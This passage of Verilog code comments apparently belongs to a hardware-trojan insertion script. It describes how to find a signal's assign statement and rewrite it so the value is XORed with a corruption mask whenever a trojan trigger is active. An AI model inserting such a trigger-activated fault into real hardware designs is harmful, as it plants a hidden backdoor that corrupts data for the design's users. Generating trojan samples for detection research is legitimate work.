...
//
// IMPORTANT: faultingDataAddr may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If faultingDataAddr is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for faultingDataAddr (or first output assign):
//     assign faultingDataAddr = <expr>;
//   Replace with:
//     assign faultingDataAddr = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
